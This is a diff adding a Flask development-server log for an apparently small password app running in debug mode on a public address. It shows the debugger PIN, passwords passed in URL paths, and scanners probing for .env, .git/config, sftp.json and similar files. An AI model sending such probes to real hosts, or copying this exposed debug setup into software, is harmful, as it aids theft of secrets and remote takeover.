+106.39.130.101 - - [09/Sep/2024 20:26:35] "GET /security_check/test/218218 HTTP/1.1" 200 -
+106.39.130.101 - - [09/Sep/2024 20:26:35] "GET /security_check/test/218218 HTTP/1.1" 200 -
+106.39.130.101 - - [09/Sep/2024 20:26:35] "GET /security_check/test/218218 HTTP/1.1" 200 -
+106.39.130.101 - - [09/Sep/2024 20:26:35] "GET /security_check/test/218218 HTTP/1.1" 200 -
+106.39.130.101 - - [09/Sep/2024 20:26:36] "GET /security_check/test/218218 HTTP/1.1" 200 -
+106.39.130.101 - - [09/Sep/2024 20:26:36] "GET /security_check/test/218218 HTTP/1.1" 200 -
+106.39.130.101 - - [09/Sep/2024 20:26:36] "GET /security_check/test/218218 HTTP/1.1" 200 -
+106.39.130.101 - - [09/Sep/2024 20:26:52] "GET /register HTTP/1.1" 200 -
+106.39.130.101 - - [09/Sep/2024 20:26:52] "GET /register HTTP/1.1" 200 -
+106.39.130.101 - - [09/Sep/2024 20:26:59] "GET /id_exist/test HTTP/1.1" 200 -
+106.39.130.101 - - [09/Sep/2024 20:26:59] "GET /id_get_route/218218/218218 HTTP/1.1" 200 -
+106.39.130.101 - - [09/Sep/2024 20:26:59] "GET / HTTP/1.1" 200 -
+106.39.130.101 - - [09/Sep/2024 20:27:04] "GET /idget/test HTTP/1.1" 200 -
+106.39.130.101 - - [09/Sep/2024 20:27:04] "GET /security_check/test/218218 HTTP/1.1" 200 -
+106.39.130.101 - - [09/Sep/2024 20:27:33] "GET /register HTTP/1.1" 200 -
+106.39.130.101 - - [09/Sep/2024 20:27:33] "GET /register HTTP/1.1" 200 -
+106.39.130.101 - - [09/Sep/2024 20:27:42] "GET /id_exist/test123 HTTP/1.1" 200 -
+106.39.130.101 - - [09/Sep/2024 20:27:48] "GET /id_exist/test1 HTTP/1.1" 200 -
+106.39.130.101 - - [09/Sep/2024 20:27:48] "GET /id_get_route/218218/218218 HTTP/1.1" 200 -
+106.39.130.101 - - [09/Sep/2024 20:27:48] "GET / HTTP/1.1" 200 -
+106.39.130.101 - - [09/Sep/2024 20:27:55] "GET /idget/test1 HTTP/1.1" 200 -
+106.39.130.101 - - [09/Sep/2024 20:27:55] "GET /security_check/test1/218218 HTTP/1.1" 200 -
+127.0.0.1 - - [09/Sep/2024 20:30:03] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [09/Sep/2024 20:30:10] "GET /idget/test123 HTTP/1.1" 200 -
+127.0.0.1 - - [09/Sep/2024 20:30:10] "GET /security_check/test123/test123 HTTP/1.1" 200 -
+ * Detected change in '/home/caoyufei/pass/password/main_1.py', reloading
+插入成功
+test123
+test123
+test123
+test123
+test123
+test123
+test123
+test123
+test123
+插入成功
+hy
+插入成功
+8756
+test123
+test123
+插入成功
+(1062, "Duplicate entry '218218' for key 'person_password.PRIMARY'")
+执行插入数据失败
+123456
+test
+test
+test
+test
+test
+test
+test
+test
+test
+test
+(1062, "Duplicate entry '218218' for key 'person_password.PRIMARY'")
+执行插入数据失败
+test
+(1062, "Duplicate entry '218218' for key 'person_password.PRIMARY'")
+执行插入数据失败
+test1
+test123
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 115-489-574
+157.55.39.200 - - [09/Sep/2024 20:35:32] "GET / HTTP/1.1" 200 -
+106.39.130.101 - - [09/Sep/2024 20:37:45] "GET / HTTP/1.1" 200 -
+106.39.130.101 - - [09/Sep/2024 20:37:46] "GET / HTTP/1.1" 200 -
+106.39.130.101 - - [09/Sep/2024 20:37:46] "GET / HTTP/1.1" 200 -
+106.39.130.101 - - [09/Sep/2024 20:38:32] "GET / HTTP/1.1" 200 -
+106.39.130.101 - - [09/Sep/2024 20:38:38] "GET / HTTP/1.1" 200 -
+106.39.130.101 - - [09/Sep/2024 20:39:33] "GET /register HTTP/1.1" 200 -
+106.39.130.101 - - [09/Sep/2024 20:39:35] "GET /register HTTP/1.1" 200 -
+106.39.130.101 - - [09/Sep/2024 20:39:39] "GET / HTTP/1.1" 200 -
+106.39.130.101 - - [09/Sep/2024 20:39:41] "GET / HTTP/1.1" 200 -
+106.39.130.101 - - [09/Sep/2024 20:39:50] "GET / HTTP/1.1" 200 -
+106.39.130.101 - - [09/Sep/2024 20:40:00] "GET / HTTP/1.1" 200 -
+106.39.130.101 - - [09/Sep/2024 20:40:00] "GET / HTTP/1.1" 200 -
+106.39.130.101 - - [09/Sep/2024 20:40:00] "GET / HTTP/1.1" 200 -
+106.39.130.101 - - [09/Sep/2024 20:40:01] "GET / HTTP/1.1" 200 -
+106.39.130.101 - - [09/Sep/2024 20:40:01] "GET / HTTP/1.1" 200 -
+106.39.130.101 - - [09/Sep/2024 20:40:02] "GET /register HTTP/1.1" 200 -
+106.39.130.101 - - [09/Sep/2024 20:40:04] "GET / HTTP/1.1" 200 -
+106.39.130.101 - - [09/Sep/2024 20:40:32] "GET /register HTTP/1.1" 200 -
+106.39.130.101 - - [09/Sep/2024 20:40:47] "GET / HTTP/1.1" 200 -
+106.39.130.101 - - [09/Sep/2024 20:40:47] "GET / HTTP/1.1" 200 -
+106.39.130.101 - - [09/Sep/2024 20:42:00] "GET / HTTP/1.1" 200 -
+106.39.130.101 - - [09/Sep/2024 20:42:20] "GET / HTTP/1.1" 200 -
+106.39.130.101 - - [09/Sep/2024 20:42:20] "GET / HTTP/1.1" 200 -
+ * Serving Flask app 'main_1'
+ * Debug mode: on
+WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:5000
+ * Running on http://103.242.175.245:5000
+Press CTRL+C to quit
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 115-489-574
+106.39.130.101 - - [09/Sep/2024 20:43:37] "GET / HTTP/1.1" 200 -
+ * Serving Flask app 'main_1'
+ * Debug mode: on
+WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:5000
+ * Running on http://103.242.175.245:5000
+Press CTRL+C to quit
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 115-489-574
+106.39.130.101 - - [09/Sep/2024 20:51:40] "GET / HTTP/1.1" 200 -
+106.39.130.101 - - [09/Sep/2024 20:51:43] "GET /idget/123456 HTTP/1.1" 200 -
+106.39.130.101 - - [09/Sep/2024 20:51:43] "GET /security_check/123456/123456 HTTP/1.1" 200 -
+106.39.130.101 - - [09/Sep/2024 20:52:07] "GET / HTTP/1.1" 200 -
+106.39.130.101 - - [09/Sep/2024 20:52:07] "GET / HTTP/1.1" 200 -
+106.39.130.101 - - [09/Sep/2024 20:52:09] "GET /idget/123456 HTTP/1.1" 200 -
+106.39.130.101 - - [09/Sep/2024 20:52:09] "GET /security_check/123456/123456 HTTP/1.1" 200 -
+127.0.0.1 - - [09/Sep/2024 20:58:18] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [09/Sep/2024 20:58:18] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [09/Sep/2024 20:58:30] "GET /idget/test HTTP/1.1" 200 -
+127.0.0.1 - - [09/Sep/2024 20:58:30] "GET /security_check/test/218218 HTTP/1.1" 200 -
+207.46.13.150 - - [09/Sep/2024 21:00:14] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [09/Sep/2024 21:00:53] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00½\x01\x00\x00¹\x03\x03èVLWÓ\x8d\x17Ý!8e>\x7fÅ¡\x83ä')
+127.0.0.1 - - [09/Sep/2024 21:00:53] "\x16\x03\x01\x00½\x01\x00\x00¹\x03\x03èVLWÓ\x8d\x17Ý!8e>\x7fÅ¡\x83ä\x1fT¥èì9âã\x07\x0f¿g=fU\x00\x008À,À0\x00\x9fÌ©Ì¨ÌªÀ+À/\x00\x9eÀ$À(\x00kÀ#À'\x00gÀ" HTTPStatus.BAD_REQUEST -
+127.0.0.1 - - [09/Sep/2024 21:00:54] code 400, message Bad request syntax ('\x16\x03\x01\x00½\x01\x00\x00¹\x03\x03·\x04h:-\x98õïò]\x0fá\x82Ú~"æg¿\x83[\\ª\x93a:\x9bÛSßw¨\x00\x008À,À0\x00\x9fÌ©Ì¨ÌªÀ+À/\x00\x9eÀ$À(\x00kÀ#À\'\x00gÀ')
+127.0.0.1 - - [09/Sep/2024 21:00:54] "\x16\x03\x01\x00½\x01\x00\x00¹\x03\x03·\x04h:-\x98õïò]\x0fá\x82Ú~"æg¿\x83[\\ª\x93a:\x9bÛSßw¨\x00\x008À,À0\x00\x9fÌ©Ì¨ÌªÀ+À/\x00\x9eÀ$À(\x00kÀ#À'\x00gÀ" HTTPStatus.BAD_REQUEST -
+127.0.0.1 - - [09/Sep/2024 21:01:10] code 400, message Bad request version ("wÝÉiÀÊÆè\x99\x9bàù\x14íZ\x00\x008À,À0\x00\x9fÌ©Ì¨ÌªÀ+À/\x00\x9eÀ$À(\x00kÀ#À'\x00gÀ")
+127.0.0.1 - - [09/Sep/2024 21:01:10] "\x16\x03\x01\x00½\x01\x00\x00¹\x03\x03\x1dÁ.¤\x06o\x1c\x91~/ô¥\x90¢Êl\x0bwÝÉiÀÊÆè\x99\x9bàù\x14íZ\x00\x008À,À0\x00\x9fÌ©Ì¨ÌªÀ+À/\x00\x9eÀ$À(\x00kÀ#À'\x00gÀ" HTTPStatus.BAD_REQUEST -
+127.0.0.1 - - [09/Sep/2024 21:01:11] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00½\x01\x00\x00¹\x03\x03T»@D$\x8c')
+127.0.0.1 - - [09/Sep/2024 21:01:11] "\x16\x03\x01\x00½\x01\x00\x00¹\x03\x03T»@D$\x8c\x0cTR:î·Þ\x89êVk¼&kõ\x81Ó\x91òÆ8.Ó\x99\x95\x93\x00\x008À,À0\x00\x9fÌ©Ì¨ÌªÀ+À/\x00\x9eÀ$À(\x00kÀ#À'\x00gÀ" HTTPStatus.BAD_REQUEST -
+127.0.0.1 - - [09/Sep/2024 21:01:15] code 400, message Bad request syntax ("\x16\x03\x01\x00½\x01\x00\x00¹\x03\x03è/lºÓkÛH\x90\x03æsjàx\x9aM\x9c\x01)yÉ\\¥O\x7f0ïBv¤Ó\x00\x008À,À0\x00\x9fÌ©Ì¨ÌªÀ+À/\x00\x9eÀ$À(\x00kÀ#À'\x00gÀ")
+127.0.0.1 - - [09/Sep/2024 21:01:15] "\x16\x03\x01\x00½\x01\x00\x00¹\x03\x03è/lºÓkÛH\x90\x03æsjàx\x9aM\x9c\x01)yÉ\\¥O\x7f0ïBv¤Ó\x00\x008À,À0\x00\x9fÌ©Ì¨ÌªÀ+À/\x00\x9eÀ$À(\x00kÀ#À'\x00gÀ" HTTPStatus.BAD_REQUEST -
+127.0.0.1 - - [09/Sep/2024 21:01:16] code 400, message Bad request syntax ("\x16\x03\x01\x00½\x01\x00\x00¹\x03\x03àj\x9eF)Ø&ãZ¢Q\xad\x8döt\x0ea¿Ôý÷°1Å¬÷Ð))EÅ»\x00\x008À,À0\x00\x9fÌ©Ì¨ÌªÀ+À/\x00\x9eÀ$À(\x00kÀ#À'\x00gÀ")
+127.0.0.1 - - [09/Sep/2024 21:01:16] "\x16\x03\x01\x00½\x01\x00\x00¹\x03\x03àj\x9eF)Ø&ãZ¢Q­\x8döt\x0ea¿Ôý÷°1Å¬÷Ð))EÅ»\x00\x008À,À0\x00\x9fÌ©Ì¨ÌªÀ+À/\x00\x9eÀ$À(\x00kÀ#À'\x00gÀ" HTTPStatus.BAD_REQUEST -
+127.0.0.1 - - [09/Sep/2024 21:01:17] code 400, message Bad request syntax ("\x16\x03\x01\x00½\x01\x00\x00¹\x03\x03ºÌæn\x8d\x16û*Ô¶wäùº×\x01~\x9e1þ¯¹ØXÊVÂ¡\x9bø\x87f\x00\x008À,À0\x00\x9fÌ©Ì¨ÌªÀ+À/\x00\x9eÀ$À(\x00kÀ#À'\x00gÀ")
+127.0.0.1 - - [09/Sep/2024 21:01:17] "\x16\x03\x01\x00½\x01\x00\x00¹\x03\x03ºÌæn\x8d\x16û*Ô¶wäùº×\x01~\x9e1þ¯¹ØXÊVÂ¡\x9bø\x87f\x00\x008À,À0\x00\x9fÌ©Ì¨ÌªÀ+À/\x00\x9eÀ$À(\x00kÀ#À'\x00gÀ" HTTPStatus.BAD_REQUEST -
+127.0.0.1 - - [09/Sep/2024 21:01:20] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00½\x01\x00\x00¹\x03\x03l;ÞÃ')
+127.0.0.1 - - [09/Sep/2024 21:01:20] "\x16\x03\x01\x00½\x01\x00\x00¹\x03\x03l;ÞÃ\x85`üZ$~ÎßáËÕ\x86s£\x94ñm\x9ftO'p'\x9fßû\x8a÷\x00\x008À,À0\x00\x9fÌ©Ì¨ÌªÀ+À/\x00\x9eÀ$À(\x00kÀ#À'\x00gÀ" HTTPStatus.BAD_REQUEST -
+127.0.0.1 - - [09/Sep/2024 21:01:25] code 400, message Bad request version ("Ä\x12û\x97\x88\x00\x008À,À0\x00\x9fÌ©Ì¨ÌªÀ+À/\x00\x9eÀ$À(\x00kÀ#À'\x00gÀ")
+127.0.0.1 - - [09/Sep/2024 21:01:25] "\x16\x03\x01\x00½\x01\x00\x00¹\x03\x03\x15):²\x8fÏ±\x85â@¹Å\x9a\x1fÜiF\x88Ì%§\x17\x17ãIt\x0cÄ\x12û\x97\x88\x00\x008À,À0\x00\x9fÌ©Ì¨ÌªÀ+À/\x00\x9eÀ$À(\x00kÀ#À'\x00gÀ" HTTPStatus.BAD_REQUEST -
+127.0.0.1 - - [09/Sep/2024 21:01:31] code 400, message Bad request syntax ("\x16\x03\x01\x00½\x01\x00\x00¹\x03\x03Óf\x0fÕG\x16É,ÍUr\x8d\x1bBC\x08]POÚäÚúÂ\x00\x92\x8cÈ\x06\x91.×\x00\x008À,À0\x00\x9fÌ©Ì¨ÌªÀ+À/\x00\x9eÀ$À(\x00kÀ#À'\x00gÀ")
+127.0.0.1 - - [09/Sep/2024 21:01:31] "\x16\x03\x01\x00½\x01\x00\x00¹\x03\x03Óf\x0fÕG\x16É,ÍUr\x8d\x1bBC\x08]POÚäÚúÂ\x00\x92\x8cÈ\x06\x91.×\x00\x008À,À0\x00\x9fÌ©Ì¨ÌªÀ+À/\x00\x9eÀ$À(\x00kÀ#À'\x00gÀ" HTTPStatus.BAD_REQUEST -
+127.0.0.1 - - [09/Sep/2024 21:01:38] code 400, message Bad request syntax ('\x16\x03\x01\x00½\x01\x00\x00¹\x03\x03A@\x81\x10»Û£Ô";å\xad\x01a\x19h\x81âÀñ\x92ö(vÕíÃÓ\x19Â÷\x0f\x00\x008À,À0\x00\x9fÌ©Ì¨ÌªÀ+À/\x00\x9eÀ$À(\x00kÀ#À\'\x00gÀ')
+127.0.0.1 - - [09/Sep/2024 21:01:38] "\x16\x03\x01\x00½\x01\x00\x00¹\x03\x03A@\x81\x10»Û£Ô";å­\x01a\x19h\x81âÀñ\x92ö(vÕíÃÓ\x19Â÷\x0f\x00\x008À,À0\x00\x9fÌ©Ì¨ÌªÀ+À/\x00\x9eÀ$À(\x00kÀ#À'\x00gÀ" HTTPStatus.BAD_REQUEST -
+127.0.0.1 - - [09/Sep/2024 21:01:53] code 400, message Bad request syntax ("\x16\x03\x01\x00½\x01\x00\x00¹\x03\x03\x1a¨\x1bý\x9a\x99õEYVÉsç\x00+?\x9d69\x81\x8deÜÒ¦\x97`ïYhÓâ\x00\x008À,À0\x00\x9fÌ©Ì¨ÌªÀ+À/\x00\x9eÀ$À(\x00kÀ#À'\x00gÀ")
+127.0.0.1 - - [09/Sep/2024 21:01:53] "\x16\x03\x01\x00½\x01\x00\x00¹\x03\x03\x1a¨\x1bý\x9a\x99õEYVÉsç\x00+?\x9d69\x81\x8deÜÒ¦\x97`ïYhÓâ\x00\x008À,À0\x00\x9fÌ©Ì¨ÌªÀ+À/\x00\x9eÀ$À(\x00kÀ#À'\x00gÀ" HTTPStatus.BAD_REQUEST -
+36.112.29.17 - - [09/Sep/2024 21:02:13] "GET / HTTP/1.1" 200 -
+36.112.29.17 - - [09/Sep/2024 21:02:13] "GET /favicon.ico HTTP/1.1" 404 -
+36.112.29.17 - - [09/Sep/2024 21:02:22] "GET /idget/test HTTP/1.1" 200 -
+36.112.29.17 - - [09/Sep/2024 21:02:22] "GET /security_check/test/218218 HTTP/1.1" 200 -
+127.0.0.1 - - [09/Sep/2024 21:02:42] code 400, message Bad request version ("ÿ\x00\x008À,À0\x00\x9fÌ©Ì¨ÌªÀ+À/\x00\x9eÀ$À(\x00kÀ#À'\x00gÀ")
+127.0.0.1 - - [09/Sep/2024 21:02:42] "\x16\x03\x01\x00½\x01\x00\x00¹\x03\x03!°$H¡X#YÁÈ>\x98\x1a8ì©8Bh×\x7fÓO 1X\x93%ý\x93\x1fÿ\x00\x008À,À0\x00\x9fÌ©Ì¨ÌªÀ+À/\x00\x9eÀ$À(\x00kÀ#À'\x00gÀ" HTTPStatus.BAD_REQUEST -
+127.0.0.1 - - [09/Sep/2024 21:02:48] code 400, message Bad request version ("«RY\x1bwQÖÉ\x00\x008À,À0\x00\x9fÌ©Ì¨ÌªÀ+À/\x00\x9eÀ$À(\x00kÀ#À'\x00gÀ")
+127.0.0.1 - - [09/Sep/2024 21:02:48] "\x16\x03\x01\x00½\x01\x00\x00¹\x03\x03\x0bOªu\x8d\x0d\x88xH\\%¶ý\x16·!\x14\x08'î8\x96ì\x0d«RY\x1bwQÖÉ\x00\x008À,À0\x00\x9fÌ©Ì¨ÌªÀ+À/\x00\x9eÀ$À(\x00kÀ#À'\x00gÀ" HTTPStatus.BAD_REQUEST -
+127.0.0.1 - - [09/Sep/2024 21:02:57] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [09/Sep/2024 21:03:00] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [09/Sep/2024 21:04:27] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [09/Sep/2024 21:17:01] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [09/Sep/2024 21:17:02] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [09/Sep/2024 21:17:05] "GET /idget/123456 HTTP/1.1" 200 -
+127.0.0.1 - - [09/Sep/2024 21:17:05] "GET /security_check/123456/123456 HTTP/1.1" 200 -
+127.0.0.1 - - [09/Sep/2024 21:46:45] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [09/Sep/2024 21:47:16] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [09/Sep/2024 21:47:21] "GET /idget/test HTTP/1.1" 200 -
+127.0.0.1 - - [09/Sep/2024 21:47:21] "GET /security_check/test/218218 HTTP/1.1" 200 -
+127.0.0.1 - - [09/Sep/2024 21:49:52] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [09/Sep/2024 22:02:24] "GET /idget/test HTTP/1.1" 200 -
+127.0.0.1 - - [09/Sep/2024 22:02:24] "GET /security_check/test/218218 HTTP/1.1" 200 -
+127.0.0.1 - - [09/Sep/2024 22:02:24] "GET /idget/test HTTP/1.1" 200 -
+127.0.0.1 - - [09/Sep/2024 22:02:24] "GET /security_check/test/218218 HTTP/1.1" 200 -
+127.0.0.1 - - [09/Sep/2024 23:22:40] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [09/Sep/2024 23:48:10] "GET / HTTP/1.1" 200 -
+128.14.188.106 - - [09/Sep/2024 23:49:26] "GET / HTTP/1.1" 200 -
+198.235.24.213 - - [10/Sep/2024 02:38:25] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [10/Sep/2024 04:45:01] "GET /robots.txt HTTP/1.1" 404 -
+127.0.0.1 - - [10/Sep/2024 04:45:29] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [10/Sep/2024 04:52:41] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [10/Sep/2024 04:53:19] "GET / HTTP/1.1" 200 -
+8.130.103.35 - - [10/Sep/2024 06:48:36] code 400, message Bad request version ('\x94vn')
+8.130.103.35 - - [10/Sep/2024 06:48:36] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x039\x14\x98"é#£m©(W\x8a\x0eRE9\x8b¸ªY\x0cå8\x80SFü\x1d$Zæ\x90 Ã\x09¢Ä\x85\x94vn" HTTPStatus.BAD_REQUEST -
+8.130.103.35 - - [10/Sep/2024 06:51:56] "GET / HTTP/1.1" 200 -
+8.130.103.35 - - [10/Sep/2024 06:52:15] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [10/Sep/2024 09:28:57] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [10/Sep/2024 09:29:06] "GET /idget/test HTTP/1.1" 200 -
+127.0.0.1 - - [10/Sep/2024 09:29:06] "GET /security_check/test/218218 HTTP/1.1" 200 -
+127.0.0.1 - - [10/Sep/2024 09:30:23] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [10/Sep/2024 09:30:27] "GET /idget/test HTTP/1.1" 200 -
+127.0.0.1 - - [10/Sep/2024 09:30:27] "GET /security_check/test/218218 HTTP/1.1" 200 -
+127.0.0.1 - - [10/Sep/2024 09:32:38] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [10/Sep/2024 09:32:41] "GET /idget/test HTTP/1.1" 200 -
+127.0.0.1 - - [10/Sep/2024 09:32:41] "GET /security_check/test/218218 HTTP/1.1" 200 -
+127.0.0.1 - - [10/Sep/2024 10:27:45] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [10/Sep/2024 10:27:52] "GET /idget/123456 HTTP/1.1" 200 -
+127.0.0.1 - - [10/Sep/2024 10:27:52] "GET /security_check/123456/123456 HTTP/1.1" 200 -
+127.0.0.1 - - [10/Sep/2024 10:28:10] "GET /idget/123456 HTTP/1.1" 200 -
+127.0.0.1 - - [10/Sep/2024 10:28:10] "GET /security_check/123456/123456 HTTP/1.1" 200 -
+199.45.154.140 - - [10/Sep/2024 10:33:05] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03*{\x06\x14}Õ0£ð@8\x89;D\x91\x13\x16¹\x92·Å\x06iî\x01\x05\x10ª0IMt')
+199.45.154.140 - - [10/Sep/2024 10:33:05] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03*{\x06\x14}Õ0£ð@8\x89;D\x91\x13\x16¹\x92·Å\x06iî\x01\x05\x10ª0IMt l«¨ãÌ¥pÁ\x97\x04©" HTTPStatus.BAD_REQUEST -
+199.45.154.140 - - [10/Sep/2024 10:33:11] "GET / HTTP/1.1" 200 -
+199.45.154.140 - - [10/Sep/2024 10:33:16] "GET / HTTP/1.1" 200 -
+199.45.154.140 - - [10/Sep/2024 10:33:17] "GET /favicon.ico HTTP/1.1" 404 -
+199.45.154.140 - - [10/Sep/2024 10:33:18] code 505, message Invalid HTTP version (2.0)
+199.45.154.140 - - [10/Sep/2024 10:33:18] "PRI * HTTP/2.0" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+45.84.89.2 - - [10/Sep/2024 10:49:27] code 400, message Bad request version ('\x00\x04\x03\x00\x01\x02\x00')
+45.84.89.2 - - [10/Sep/2024 10:49:27] "\x16\x03\x01\x00\x85\x01\x00\x00\x81\x03\x03UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU\x00\x00\x06À0\x00\x9c\x00\x9d\x01\x00\x00R\x00\x0b\x00\x04\x03\x00\x01\x02\x00" HTTPStatus.BAD_REQUEST -
+127.0.0.1 - - [10/Sep/2024 10:53:05] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [10/Sep/2024 10:53:05] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [10/Sep/2024 10:53:09] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [10/Sep/2024 10:53:09] "GET /security_check/123/123 HTTP/1.1" 200 -
+127.0.0.1 - - [10/Sep/2024 10:53:47] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [10/Sep/2024 10:54:01] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [10/Sep/2024 10:54:01] "GET /security_check/123/123 HTTP/1.1" 200 -
+36.112.29.125 - - [10/Sep/2024 10:55:04] "GET / HTTP/1.1" 200 -
+36.112.29.125 - - [10/Sep/2024 10:55:04] "GET /favicon.ico HTTP/1.1" 404 -
+36.112.29.125 - - [10/Sep/2024 10:55:11] "GET /idget/123 HTTP/1.1" 200 -
+36.112.29.125 - - [10/Sep/2024 10:55:11] "GET /security_check/123/123 HTTP/1.1" 200 -
+36.112.29.125 - - [10/Sep/2024 10:56:46] "GET / HTTP/1.1" 200 -
+36.112.29.125 - - [10/Sep/2024 10:56:46] "GET /favicon.ico HTTP/1.1" 404 -
+36.112.29.125 - - [10/Sep/2024 10:56:52] "GET /idget/123 HTTP/1.1" 200 -
+36.112.29.125 - - [10/Sep/2024 10:56:52] "GET /security_check/123/123 HTTP/1.1" 200 -
+127.0.0.1 - - [10/Sep/2024 10:59:20] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [10/Sep/2024 10:59:21] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [10/Sep/2024 10:59:40] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [10/Sep/2024 10:59:44] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [10/Sep/2024 10:59:45] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [10/Sep/2024 11:13:52] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [10/Sep/2024 11:14:19] "GET /tencent15053542197349143936.txt HTTP/1.1" 404 -
+127.0.0.1 - - [10/Sep/2024 11:14:19] "GET /tencent15053542197349143936.txt HTTP/1.1" 404 -
+164.90.208.56 - - [10/Sep/2024 11:58:56] code 400, message Bad request version ('À\x13À')
+164.90.208.56 - - [10/Sep/2024 11:58:56] "\x16\x03\x01\x00ê\x01\x00\x00æ\x03\x03C\x94ßØÃ¼@¡(ãe\x9cßD\x02ê$G\x99Y1\x9däOuSÁ·­Ô}V \x0dqÉI`À\x8c\x82\x8f7\x99\x06Çáè!?0iBw\x94¶Ë¼¤rÃ\x16Ðä\x1e\x00&À+À/À,À0Ì©Ì¨À\x09À\x13À" HTTPStatus.BAD_REQUEST -
+164.90.208.56 - - [10/Sep/2024 11:58:57] "GET / HTTP/1.1" 200 -
+164.90.208.56 - - [10/Sep/2024 11:58:58] "GET / HTTP/1.1" 200 -
+164.90.208.56 - - [10/Sep/2024 11:58:59] "GET /server HTTP/1.1" 404 -
+164.90.208.56 - - [10/Sep/2024 11:59:00] "GET /.vscode/sftp.json HTTP/1.1" 404 -
+164.90.208.56 - - [10/Sep/2024 11:59:00] "GET /about HTTP/1.1" 404 -
+164.90.208.56 - - [10/Sep/2024 11:59:01] "GET /debug/default/view?panel=config HTTP/1.1" 404 -
+164.90.208.56 - - [10/Sep/2024 11:59:02] "GET /v2/_catalog HTTP/1.1" 404 -
+164.90.208.56 - - [10/Sep/2024 11:59:03] "GET /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application HTTP/1.1" 404 -
+164.90.208.56 - - [10/Sep/2024 11:59:04] "GET /server-status HTTP/1.1" 404 -
+164.90.208.56 - - [10/Sep/2024 11:59:05] "GET /_all_dbs HTTP/1.1" 404 -
+164.90.208.56 - - [10/Sep/2024 11:59:05] "GET /.DS_Store HTTP/1.1" 404 -
+164.90.208.56 - - [10/Sep/2024 11:59:06] "GET /.env HTTP/1.1" 404 -
+164.90.208.56 - - [10/Sep/2024 11:59:07] "GET /.git/config HTTP/1.1" 404 -
+164.90.208.56 - - [10/Sep/2024 11:59:08] "GET /s/534323e2537313e2234323e2330313/_/;/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.properties HTTP/1.1" 404 -
+164.90.208.56 - - [10/Sep/2024 11:59:08] "GET /config.json HTTP/1.1" 404 -
+164.90.208.56 - - [10/Sep/2024 11:59:09] "GET /telescope/requests HTTP/1.1" 404 -
+164.90.208.56 - - [10/Sep/2024 11:59:10] "GET /?rest_route=/wp/v2/users/ HTTP/1.1" 200 -
+127.0.0.1 - - [10/Sep/2024 14:19:57] "GET / HTTP/1.1" 200 -
+147.185.132.81 - - [10/Sep/2024 14:26:36] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [10/Sep/2024 15:12:35] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [10/Sep/2024 15:12:39] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [10/Sep/2024 15:12:39] "GET /security_check/123/123 HTTP/1.1" 200 -
+127.0.0.1 - - [10/Sep/2024 15:15:22] "GET /tencent15053542197349143936.txt HTTP/1.1" 404 -
+127.0.0.1 - - [10/Sep/2024 15:15:22] "GET /tencent15053542197349143936.txt HTTP/1.1" 404 -
+127.0.0.1 - - [10/Sep/2024 15:15:25] "GET /tencent15053542197349143936.txt HTTP/1.1" 404 -
+127.0.0.1 - - [10/Sep/2024 15:15:25] "GET /tencent15053542197349143936.txt HTTP/1.1" 404 -
+127.0.0.1 - - [10/Sep/2024 15:15:27] "GET /tencent15053542197349143936.txt HTTP/1.1" 404 -
+127.0.0.1 - - [10/Sep/2024 15:15:27] "GET /tencent15053542197349143936.txt HTTP/1.1" 404 -
+127.0.0.1 - - [10/Sep/2024 15:15:28] "GET /tencent15053542197349143936.txt HTTP/1.1" 404 -
+127.0.0.1 - - [10/Sep/2024 15:15:28] "GET /tencent15053542197349143936.txt HTTP/1.1" 404 -
+127.0.0.1 - - [10/Sep/2024 15:15:30] "GET /tencent15053542197349143936.txt HTTP/1.1" 404 -
